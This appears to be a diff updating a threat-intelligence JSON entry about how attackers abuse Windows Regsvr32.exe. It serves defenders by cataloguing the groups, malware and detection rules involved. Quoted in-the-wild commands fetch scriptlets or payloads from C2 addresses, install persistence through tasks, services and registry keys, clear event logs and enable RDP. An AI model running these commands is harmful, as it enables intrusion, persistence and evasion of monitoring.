@@ -1,153 +1,571 @@
 {
   "type": "lolbin",
-  "version": 1,
+  "version": 2,
   "id": "442ebb45-6a0c-470c-bd38-8304d2b11540",
   "created_by_ref": "@Nounou_Mbeiri",
-  "created": "2023-11-03T00:00",
-  "modified": "2023-11-03T00:00",
+  "created": "2023-11-03T00:00:00.000Z",
+  "modified": "2026-10-16T00:00:00.000Z",
   "name": "Regsvr32.exe",
-  "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
-  "Required_privilege": [
+  "image": "regsvr32.exe",
+  "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.",
+  "attack": {
+    "id": "T1218.010",
+    "name": "Regsvr32",
+    "type": "technique",
+    "url": "https://attack.mitre.org/techniques/T1218/010",
+    "version": "20.0"
+  },
+  "summary": [
+    "Bypass application control techniques",
+    "Execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory",
+    "Execute malicious scripts",
+    "Load malicious DLLs",
+    "Execute malicious DLLs",
+    "Execute malicious payloads",
+    "Run a remote scriptlet that drops a file and executes it",
+    "Ensure persistence at system boot",
+    "Run a .sct file for execution"
+  ],
+  "required_privileges": [
     "User"
   ],
   "paths": [
     "c:\\windows\\system32\\regsvr32.exe",
     "c:\\windows\\syswow64\\regsvr32.exe"
   ],
-  "hashe": "0C9318BBE9A07725154ACE027ACF7655",
-  "associated_kill_chain_phases": [
-    "TA0005:Defense Evasion:T1218.010"
-  ],
+  "hashes": {
+    "MD5": "0C9318BBE9A07725154ACE027ACF7655"
+  },
   "capabilities": [
     "AWL bypass",
     "Execute"
   ],
-  "relationship": [
-    {
-      "associated_apts": [
-        "Deep Panda",
-        "APT32",
-        "Inception",
-        "Kimsuky",
-        "Cobalt Group",
-        "WIRTE",
-        "Leviathan",
-        "TA551",
-        "APT19",
-        "Blue Mockingbird"
-      ],
-      "Relationship Malware->Regsvr32": [
-        "[HermeticWizard](https://attack.mitre.org/software/S0698) has used `regsvr32.exe /s /i` to execute malicious payloads.(Citation: ESET Hermetic Wizard March 2022)",
-        "[Egregor](https://attack.mitre.org/software/S0554) has used regsvr32.exe to execute malicious DLLs.(Citation: JoeSecurity Egregor 2020)",
-        "[Ragnar Locker](https://attack.mitre.org/software/S0481) has used regsvr32.exe to execute components of VirtualBox.(Citation: Sophos Ragnar May 2020)",
-        "[Saint Bot](https://attack.mitre.org/software/S1018) has used `regsvr32` to execute scripts.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )",
-        "[QakBot](https://attack.mitre.org/software/S0650) can use Regsvr32 to execute malicious DLLs.(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot May 2021)(Citation: ATT QakBot April 2021)(Citation: Trend Micro Black Basta October 2022)(Citation: NCC Group Black Basta June 2022)(Citation: Deep Instinct Black Basta August 2022)",
-        "[Squirrelwaffle](https://attack.mitre.org/software/S1030) has been executed using `regsvr32.exe`.(Citation: ZScaler Squirrelwaffle Sep 2021)",
-        "[Mori](https://attack.mitre.org/software/S1047) can use `regsvr32.exe` for DLL execution.(Citation: DHS CISA AA22-055A MuddyWater February 2022)",
-        "[Derusbi](https://attack.mitre.org/software/S0021) variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.(Citation: ThreatGeek Derusbi Converge)",
-        "[RogueRobin](https://attack.mitre.org/software/S0270) uses regsvr32.exe to run a .sct file for execution.(Citation: Unit42 DarkHydrus Jan 2019)",
-        "[Astaroth](https://attack.mitre.org/software/S0373) can be loaded through regsvr32.exe.(Citation: Cybereason Astaroth Feb 2019)",
-        "[Valak](https://attack.mitre.org/software/S0476) has used <code>regsvr32.exe</code> to launch malicious DLLs.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)",
-        "[EVILNUM](https://attack.mitre.org/software/S0568) can run a remote scriptlet that drops a file and executes it via regsvr32.exe.(Citation: ESET EvilNum July 2020) ",
-        "[More_eggs](https://attack.mitre.org/software/S0284) has used regsvr32.exe to execute the malicious DLL.(Citation: Security Intelligence More Eggs Aug 2019)",
-        "[AppleSeed](https://attack.mitre.org/software/S0622) can call regsvr32.exe for execution.(Citation: Malwarebytes Kimsuky June 2021)",
-        "Some [Orz](https://attack.mitre.org/software/S0229) versions have an embedded DLL known as MockDll that uses [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) and regsvr32 to execute another payload.(Citation: Proofpoint Leviathan Oct 2017)",
-        "[Xbash](https://attack.mitre.org/software/S0341) can use regsvr32 for executing scripts.(Citation: Unit42 Xbash Sept 2018)",
-        "[Hi-Zor](https://attack.mitre.org/software/S0087) executes using regsvr32.exe called from the [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) persistence mechanism.(Citation: Fidelis INOCNATION)"
-      ],
-      "associated_campaigns": [
-        "C0015",
-        "Operation Dream Job"
-      ],
-      "associated_Malware": [
-        "Koadic",
-        "HermeticWizard",
-        "Egregor",
-        "Ragnar Locker",
-        "Saint Bot",
-        "QakBot",
-        "Squirrelwaffle",
-        "Mori",
-        "Derusbi",
-        "RogueRobin",
-        "Astaroth",
-        "Valak",
-        "EVILNUM",
-        "More_eggs",
-        "AppleSeed",
-        "Orz",
-        "Xbash",
-        "Hi-Zor",
-        "Raspberry Robin"
-      ],
-      "associated_commands": [
-        "-- regsvr32 /s /n /u /i:hxxp://support.chatconnecting(.)com:80/pic.png scrobj.dll\n\n ",
-        "-- regsvr32 /s /n /u /i:hxxp://108.170.31.69:80/a scrobj.dll\n\n",
-        "-- regsvr32.exe “C:\\Users\\[redacted]\\AppData\\Roaming\\Microsoft\\Jmcoiqtmeft\\nwthu.dll””\n\n",
-        "-- C :\\Windows\\System32\\regsvr32 .exe \\\\dhqidfvyxawy0du9akl2ium.webdav . drivehq .com @SSL\\DavWWWRoot\\Ad.dll\n\n",
-        "-- powershell.exe -windowstyle hidden regsvr32.exe /s AppleSeed_Payloadcmd /c start regsvr32 /s /i ..\\\\<filename>  & start cmd /c \\\"ping localhost -n 7 & wevtutil cl System\\\"\n\n",
-        "-- cmd /c start regsvr32 /s /i ..\\\\<filename>  & start cmd /c \\\"ping localhost -n 7 & wevtutil cl System\\\".\n\n",
-        "-- regsvr32.exe /s /n /u /i:%TEMP%\\12-B-366.txt scrobj.dll\n\n",
-        "-- %windir%\\System32\\cmd.exe /c %windir%\\system32\\curl -s -o %temp%\\goAlso.rtf http[:]//146[.]70[.]79[.]52/fromMakeTell.dat&&%windir%\\system32\\regsvr32 %temp%\\goAlso.rtf\n\n",
-        "-- cmd.exe /c sc config wercplsupport start= auto && sc start wercplsupport && copy c:\\windows\\System32\\dialogex.dll c:\\windows\\System32\\wercplsupporte.dll /y && schtasks /create /tn \"Windows Problems Collection\" /tr \"regsvr32.exe /s c:\\windows\\System32\\wercplsupporte.dll\" /sc DAILY /st 20:02 /F /RU System && start \"\" regsvr32.exe /s c:\\windows\\System32\\dialogex.dll\n\n",
-        "-- sc create 8995 binPath= \"cmd /c sc config wercplsupport start= auto & sc start wercplsupport & copy c:\\windows\\System32\\8995.dll c:\\windows\\System32\\wercplsupporte.dll /y & regsvr32.exe /s c:\\windows\\System32\\8995.dll\" type= share start= auto error= ignore DisplayName= 8995"
-      ],
-      "pre_and_next_related_cmd": [
-        {
-          "pre_cmd_event": [
-            "-- powershell.exe -NoP -NonI -W Hidden -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"<base64 blob>\")\n",
-            "-- wmic ENVIRONMENT where \"name='COR_PROFILER'\" delete\n",
-            "-- wmic ENVIRONMENT create name=\"COR_ENABLE_PROFILING\",username=\"<system>\",VariableValue=\"1\"\n",
-            "-- wmic ENVIRONMENT create name=\"COR_PROFILER\",username=\"<system>\",VariableValue=\"<arbitrary CLSID>\"\n",
-            "-- REG.EXE ADD HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\<arbitrary CLSID>\\InProcServer32 /V ThreadingModel /T REG_SZ /D Apartment /F \n",
-            "-- REG.EXE ADD HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\<arbitrary CLSID>\\InProcServer32 /VE /T REG_SZ /D \"c:\\windows\\System32\\e0b3489da74f.dll\" /F"
-          ],
-          "next_cmd_event": [
-            "  -- “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update);\n",
-            "-- powershell -NoP -NonI -w Hidden -enc $x; Start-Sleep -Seconds 1\\system32\\cleanmgr.exe /autoclean /d C:”\n",
-            "-- reg add \"HKLMSystemCurrentControlSetControlTerminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f\n",
-            "-- net start MpsSvc\n  -- netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes\n",
-            "-- reg add \"HKLMSystemCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp\" /v \"UserAuthentication\" /t REG_DWORD /d 0 /f"
-          ]
-        }
-      ]
-    }
-  ],
   "platforms": [
     "windows"
   ],
-  "detections": [
-    {
-      "eventsid": [
-        {
-          "sysmon": [
-            "T1218.010:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1"
-          ],
-          "windows": [
-            "T1218.010:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
-            "T1218.010:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4103"
-          ]
-        }
-      ],
-      "sigma_rules": [
-        "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml",
-        "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml",
-        "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_http_ip_pattern.yml"
-      ],
-      "other_rules": [
-        "https://github.com/splunk/security_content/blob/develop/detections/endpoint/regsvr32_with_known_silent_switch_cmdline.yml",
-        "https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_regsvr32_application_control_bypass.yml"
-      ]
-    }
+  "associated_kill_chain_phases": [
+    "TA0005:Stealth:T1218.010"
   ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT19",
+        "attack_id": "G0073",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "APT19 used Regsvr32 to bypass application control techniques.",
+        "sources": "FireEye APT19 https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
+      },
+      {
+        "name": "APT32",
+        "attack_id": "G0050",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.",
+        "sources": "ESET OceanLotus Mar 2019 https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/; FireEye APT32 May 2017 https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html; Cybereason Cobalt Kitty 2017 https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "name": "Blue Mockingbird",
+        "attack_id": "G0108",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.",
+        "sources": "RedCanary Mockingbird May 2020 https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "name": "Cobalt Group",
+        "attack_id": "G0080",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Cobalt Group has used regsvr32.exe to execute scripts.",
+        "sources": "Talos Cobalt Group July 2018 https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html; Morphisec Cobalt Gang Oct 2018 https://blog.morphisec.com/cobalt-gang-2.0; TrendMicro Cobalt Group Nov 2017 https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/"
+      },
+      {
+        "name": "Deep Panda",
+        "attack_id": "G0009",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks.",
+        "sources": "RSA Shell Crew https://www.rsa.com/content/dam/en/white-paper/rsa-incident-response-emerging-threat-profile-shell-crew.pdf"
+      },
+      {
+        "name": "Inception",
+        "attack_id": "G0100",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Inception has ensured persistence at system boot by setting the value regsvr32 %path%\\ctfmonrn.dll /s.",
+        "sources": "Kaspersky Cloud Atlas December 2014 https://securelist.com/cloud-atlas-redoctober-apt-is-back-in-style/68083/"
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": "uses T1218.010",
+        "description": "Kimsuky has executed malware with regsvr32s.",
+        "sources": "Gen Digital Kimsuky HTTPTroy October 2025 https://www.gendigital.com/blog/insights/research/dprk-kimsuky-lazarus-analysis; KISA Operation Muzabi https://web.archive.org/web/20220328121326/https://boho.or.kr/filedownload.do?attach_file_seq=2695&attach_file_id=EpF2695.pdf"
+      },
+      {
+        "name": "Leviathan",
+        "attack_id": "G0065",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Leviathan has used regsvr32 for execution.",
+        "sources": "Proofpoint Leviathan Oct 2017 https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets"
+      },
+      {
+        "name": "Storm-0501",
+        "attack_id": "G1053",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Storm-0501 has launched Cobalt Strike Beacon files using regsvr32.exe.",
+        "sources": "Microsoft Storm-501 Sabbath Ransomware Embargo September 2024 https://www.microsoft.com/en-us/security/blog/2024/09/26/storm-0501-ransomware-attacks-expanding-to-hybrid-cloud-environments/"
+      },
+      {
+        "name": "TA551",
+        "attack_id": "G0127",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "TA551 has used regsvr32.exe to load malicious DLLs.",
+        "sources": "Unit 42 Valak July 2020 https://unit42.paloaltonetworks.com/valak-evolution/"
+      },
+      {
+        "name": "WIRTE",
+        "attack_id": "G0090",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "WIRTE has used `regsvr32.exe` to trigger the execution of a malicious script.",
+        "sources": "Lab52 WIRTE Apr 2019 https://lab52.io/blog/wirte-group-attacking-the-middle-east/"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "C0015",
+        "attack_id": "C0015",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "During C0015, the threat actors employed code that used `regsvr32` for execution.",
+        "sources": "DFIR Conti Bazar Nov 2021 https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/"
+      },
+      {
+        "name": "Operation Dream Job",
+        "attack_id": "C0022",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "During Operation Dream Job, Lazarus Group used `regsvr32` to execute malware.",
+        "sources": "ESET Lazarus Jun 2020 https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "AppleSeed",
+        "attack_id": "S0622",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "AppleSeed can call regsvr32.exe for execution.",
+        "sources": "Malwarebytes Kimsuky June 2021 https://blog.malwarebytes.com/threat-analysis/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/"
+      },
+      {
+        "name": "Astaroth",
+        "attack_id": "S0373",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Astaroth can be loaded through regsvr32.exe.",
+        "sources": "Cybereason Astaroth Feb 2019 https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research"
+      },
+      {
+        "name": "Derusbi",
+        "attack_id": "S0021",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Derusbi variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.",
+        "sources": "ThreatGeek Derusbi Converge https://www.fidelissecurity.com/threatgeek/threat-intelligence/turbo-twist-two-64-bit-derusbi-strains-converge"
+      },
+      {
+        "name": "Dridex",
+        "attack_id": "S0384",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Dridex can use `regsvr32.exe` to initiate malicious code.",
+        "sources": "Red Canary Dridex Threat Report 2021 https://redcanary.com/threat-detection-report/threats/dridex/"
+      },
+      {
+        "name": "Egregor",
+        "attack_id": "S0554",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Egregor has used regsvr32.exe to execute malicious DLLs.",
+        "sources": "JoeSecurity Egregor 2020 https://www.joesandbox.com/analysis/326673/0/pdf"
+      },
+      {
+        "name": "Emotet",
+        "attack_id": "S0367",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Emotet uses RegSvr32 to execute the DLL payload.",
+        "sources": "emotet_trendmicro_mar2023 https://www.trendmicro.com/en_us/research/23/c/emotet-returns-now-adopts-binary-padding-for-evasion.html"
+      },
+      {
+        "name": "EVILNUM",
+        "attack_id": "S0568",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "EVILNUM can run a remote scriptlet that drops a file and executes it via regsvr32.exe.",
+        "sources": "ESET EvilNum July 2020 https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/"
+      },
+      {
+        "name": "HermeticWizard",
+        "attack_id": "S0698",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "HermeticWizard has used `regsvr32.exe /s /i` to execute malicious payloads. HermeticWizard can use WMI to create a new process on a remote machine via `C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\regsvr32.exe /s /iC:\\windows\\<filename>.dll`.",
+        "sources": "ESET Hermetic Wizard March 2022 https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine"
+      },
+      {
+        "name": "Hi-Zor",
+        "attack_id": "S0087",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Hi-Zor executes using regsvr32.exe called from the Registry Run Keys / Startup Folder persistence mechanism.",
+        "sources": "Fidelis INOCNATION https://fidelissecurity.com/resource/report/fidelis-threat-advisory-1020-dissecting-the-malware-involved-in-the-inocnation-campaign/"
+      },
+      {
+        "name": "More_eggs",
+        "attack_id": "S0284",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "More_eggs has used regsvr32.exe to execute the malicious DLL.",
+        "sources": "Security Intelligence More Eggs Aug 2019 https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/"
+      },
+      {
+        "name": "Mori",
+        "attack_id": "S1047",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Mori can use `regsvr32.exe` for DLL execution.",
+        "sources": "DHS CISA AA22-055A MuddyWater February 2022 https://www.cisa.gov/uscert/ncas/alerts/aa22-055a"
+      },
+      {
+        "name": "Orz",
+        "attack_id": "S0229",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Some Orz versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload. Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload.",
+        "sources": "Proofpoint Leviathan Oct 2017 https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets"
+      },
+      {
+        "name": "QakBot",
+        "attack_id": "S0650",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "QakBot can use Regsvr32 to execute malicious DLLs.",
+        "sources": "Cyberint Qakbot May 2021 https://blog.cyberint.com/qakbot-banking-trojan; NCC Group Black Basta June 2022 https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/; Trend Micro Black Basta October 2022 https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html; ATT QakBot April 2021 https://cybersecurity.att.com/blogs/labs-research/the-rise-of-qakbot; Red Canary Qbot https://redcanary.com/threat-detection-report/threats/qbot/; Deep Instinct Black Basta August 2022 https://www.deepinstinct.com/blog/black-basta-ransomware-threat-emergence"
+      },
+      {
+        "name": "Ragnar Locker",
+        "attack_id": "S0481",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Ragnar Locker has used regsvr32.exe to execute components of VirtualBox.",
+        "sources": "Sophos Ragnar May 2020 https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/"
+      },
+      {
+        "name": "Raspberry Robin",
+        "attack_id": "S1130",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Raspberry Robin uses regsvr32.exe execution without any command line parameters for command and control requests to IP addresses associated with Tor nodes. Raspberry Robin will execute its payload prior to initializing command and control traffic by impersonating one of several legitimate program names such as dllhost.exe, regsvr32.exe, or rundll32.exe.",
+        "sources": "RedCanary RaspberryRobin 2022 https://redcanary.com/blog/threat-intelligence/raspberry-robin/; TrendMicro RaspberryRobin 2022 https://www.trendmicro.com/en_us/research/22/l/raspberry-robin-malware-targets-telecom-governments.html"
+      },
+      {
+        "name": "RogueRobin",
+        "attack_id": "S0270",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "RogueRobin uses regsvr32.exe to run a.sct file for execution.",
+        "sources": "Unit42 DarkHydrus Jan 2019 https://unit42.paloaltonetworks.com/darkhydrus-delivers-new-trojan-that-can-use-google-drive-for-c2-communications/"
+      },
+      {
+        "name": "Saint Bot",
+        "attack_id": "S1018",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Saint Bot has used `regsvr32` to execute scripts.",
+        "sources": "Malwarebytes Saint Bot April 2021 https://blog.malwarebytes.com/threat-intelligence/2021/04/a-deep-dive-into-saint-bot-downloader/; Palo Alto Unit 42 OutSteel SaintBot February 2022  https://unit42.paloaltonetworks.com/ukraine-targeted-outsteel-saintbot/"
+      },
+      {
+        "name": "Squirrelwaffle",
+        "attack_id": "S1030",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Squirrelwaffle has been executed using `regsvr32.exe`.",
+        "sources": "ZScaler Squirrelwaffle Sep 2021 https://www.zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike"
+      },
+      {
+        "name": "TONESHELL",
+        "attack_id": "S1239",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "TONESHELL has used regsvr32.exe to execute the windows `DLLRegisterServer` function.",
+        "sources": "Trend Micro Mustang Panda Earth Preta Toneshell February 2025 https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html"
+      },
+      {
+        "name": "Valak",
+        "attack_id": "S0476",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Valak has used regsvr32.exe to launch malicious DLLs.",
+        "sources": "Cybereason Valak May 2020 https://www.cybereason.com/blog/valak-more-than-meets-the-eye; Unit 42 Valak July 2020 https://unit42.paloaltonetworks.com/valak-evolution/"
+      },
+      {
+        "name": "Xbash",
+        "attack_id": "S0341",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Xbash can use regsvr32 for executing scripts.",
+        "sources": "Unit42 Xbash Sept 2018 https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/"
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "Covenant",
+        "attack_id": "S1155",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Covenant can create SCT files for installation via `Regsvr32` to deploy new Grunt listeners.",
+        "sources": "Github Covenant https://github.com/cobbr/Covenant"
+      },
+      {
+        "name": "Koadic",
+        "attack_id": "S0250",
+        "evidence": "uses T1218.010; names regsvr32.exe",
+        "description": "Koadic can use Regsvr32 to execute additional payloads.",
+        "sources": "Github Koadic https://github.com/offsecginger/koadic"
+      }
+    ],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "regsvr32 /s /n /u /i:hxxp://108.170.31.69:80/a scrobj.dll",
+        "intent": "Download and run a COM scriptlet from the C&C server, launched by cmd from an injected rundll32 process.",
+        "status": "verified",
+        "source_name": "Cybereason Cobalt Kitty 2017",
+        "source_url": "https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "command": "regsvr32.exe “C:\\Users\\[redacted]\\AppData\\Roaming\\Microsoft\\Jmcoiqtmeft\\nwthu.dll””",
+        "intent": "Qbot persistence: a Run registry entry starts the Qbot DLL with regsvr32 every time the machine starts.",
+        "status": "verified",
+        "source_name": "Trellix Royal Ransom Analysis April 2023",
+        "source_url": "https://www.trellix.com/blogs/research/a-royal-analysis-of-royal-ransom/"
+      },
+      {
+        "command": "regsvr32.exe /s /n /u /i:%TEMP%\\12-B-366.txt scrobj.dll",
+        "intent": "Run the Windows Script Component (.sct) that the malicious Excel macro wrote to %TEMP%.",
+        "status": "verified",
+        "source_name": "Unit42 DarkHydrus Jan 2019",
+        "source_url": "https://unit42.paloaltonetworks.com/darkhydrus-delivers-new-trojan-that-can-use-google-drive-for-c2-communications/"
+      },
+      {
+        "command": "regsvr32.exe /s dialogex.dll",
+        "intent": "Execute the XMRIG miner payload DLL through its DllRegisterServer export.",
+        "status": "verified",
+        "source_name": "Red Canary Blue Mockingbird May 2020",
+        "source_url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "command": "cmd.exe /c sc config wercplsupport start= auto && sc start wercplsupport && copy c:\\windows\\System32\\dialogex.dll c:\\windows\\System32\\wercplsupporte.dll /y && schtasks /create /tn 'Windows Problems Collection' /tr 'regsvr32.exe /s c:\\windows\\System32\\wercplsupporte.dll' /sc DAILY /st 20:02 /F /RU System && start '' regsvr32.exe /s c:\\windows\\System32\\dialogex.dll",
+        "intent": "Command run by the COR_PROFILER payload to re-establish persistence: a daily scheduled task and an immediate start of the miner DLL with regsvr32.",
+        "status": "verified",
+        "source_name": "Red Canary Blue Mockingbird May 2020",
+        "source_url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "command": "sc create 8995 binPath= 'cmd /c sc config wercplsupport start= auto & sc start wercplsupport & copy c:\\windows\\System32\\8995.dll c:\\windows\\System32\\wercplsupporte.dll /y & regsvr32.exe /s c:\\windows\\System32\\8995.dll' type= share start= auto error= ignore DisplayName= 8995",
+        "intent": "A new service performing the same persistence actions as the COR_PROFILER payload, ending in regsvr32 loading the miner DLL.",
+        "status": "verified",
+        "source_name": "Red Canary Blue Mockingbird May 2020",
+        "source_url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "command": "powershell.exe -windowstyle hidden regsvr32.exe /s AppleSeed_Payload",
+        "intent": "The dropper script runs the decoded AppleSeed DLL through PowerShell and regsvr32, which calls its DllRegisterServer export.",
+        "status": "verified",
+        "source_name": "Malwarebytes Kimsuky AppleSeed June 2021",
+        "source_url": "https://blog.malwarebytes.com/threat-analysis/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/"
+      },
+      {
+        "command": "regsvr32 %path%\\ctfmonrn.dll /s",
+        "intent": "Run key value set by the VBS so the ctfmonrn.dll loader runs at every system boot.",
+        "status": "verified",
+        "source_name": "Kaspersky Cloud Atlas December 2014",
+        "source_url": "https://securelist.com/cloud-atlas-redoctober-apt-is-back-in-style/68083/"
+      },
+      {
+        "command": "cmd /c start regsvr32 /s /i ..\\\\<filename> & start cmd /c \\\"ping localhost -n 7 & wevtutil cl System\\\"",
